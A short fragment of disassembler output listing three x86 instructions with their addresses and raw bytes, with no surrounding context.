  404c89:	02 6f de             	add    -0x22(%edi),%ch
  404c8c:	00 00                	add    %al,(%eax)
  404c8e:	0a 74 01 00          	or     0x0(%ecx,%eax,1),%dh
